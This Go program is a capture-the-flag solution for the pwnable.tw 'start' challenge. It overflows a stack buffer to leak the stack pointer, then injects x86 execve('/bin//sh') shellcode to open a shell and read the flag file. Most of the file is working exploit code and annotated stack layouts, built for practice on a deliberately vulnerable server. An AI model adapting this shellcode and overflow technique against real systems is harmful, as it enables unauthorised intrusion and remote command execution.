package main

import (
  "net"
  "bufio"
  "encoding/binary"
  "fmt"
  "log"
  "strings"
)

func main() {
    shellcode := "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    read_buffer := make([]byte, 1024)

    conn, err := net.Dial("tcp", "chall.pwnable.tw:10000")
    if err != nil {
      fmt.Println("[-] connection failed")
      log.Fatal(err)
    }
    defer conn.Close()
    conn_reader := bufio.NewReader(conn).Read
    fmt.Println("[+] connection made")

    // Read first bit of output text
    conn_reader(read_buffer)
    fmt.Println("[=] output:" + string(read_buffer))

    // Retrieve stack pointer by buffer overflow
    // bytes 21 -> 24 with return address of 0x08048087:
    // Program control flow:
    //    push "Let's start the CTF:" <- 20 bytes
    //    save new stack pointer ESP_2 = (ESP_1 - 20)
    //    ***
    //    write ESP_2 for 20 bytes to STDOUT
    //    read STDIN for 60 bytes at ESP_2
    //    add 20 to ESP_2 to set back to ESP_1
    //    return @ value of ESP_1
    //
    // By writing 0x08048087 to the 21 -> 24 bytes, we overwrite
    // ESP_2 to then go back to the line with ***
    // except this time:
    //    write ESP_1 for 20 bytes to STDOUT which returns the stack ptr in
    //    bytes 0->3.
    //                [ og_esp ][ return pointer ][ acbd ][ acbd ][ acbd ][ acbd ]
    //                ^ og_esp
    //                                                                           ^ ESP_1
    //stdout
    //stdin
    //                                           ^ ESP_2
    //                          ---- idx 0->3 ---
    //                         ^ esp after return -> aka ESPR(-4)
    //
    // At this point we write 20 bytes, then overwrite the next return value
    // which should be ESPR + 20
    // [ shell code ][ new return ptr ][ aaaa ][ aaaa ][ aaaa ][ aaaa(og_esp) ]
    //                                                                        ^ espr
    //              ^ value of [ new return ptr ]
    i32_return_addr := binary.BigEndian.Uint32([]byte("\x08\x04\x80\x87"))
    b_return_addr := make([]byte, 4)
    binary.LittleEndian.PutUint32(b_return_addr, i32_return_addr)
    fmt.Println("[+] Return Address:" + fmt.Sprintf("%X", i32_return_addr))
    payload := strings.Repeat("A", 20)
    payload += string(b_return_addr)
    fmt.Println("[+] payload built:" + payload)
    conn.Write([]byte(payload))
    conn_reader(read_buffer)
    fmt.Println("[=] output:" + string(read_buffer))

    // Grab leaked ESP and update to our shellcode
    i32_esp := binary.LittleEndian.Uint32(read_buffer[:4])
    fmt.Println("[+] ESP:" + fmt.Sprintf("%X", i32_esp))
    i32_esp += 20
    b_esp := make([]byte, 4)
    binary.LittleEndian.PutUint32(b_esp, i32_esp)
    fmt.Println("[+] New ESP:" + fmt.Sprintf("%X", i32_esp))

    // Send shellcode
    payload = strings.Repeat("A", 20)
    payload += string(b_esp)
    payload += string(shellcode)
    fmt.Println("[+] payload built:" + payload)
    conn.Write([]byte(payload))
    fmt.Println("[+] sending cmdline cmd")
    conn.Write([]byte("cat /home/start/flag\n"))
    conn_reader(read_buffer)
    fmt.Println("[=] output:" + string(read_buffer))
}
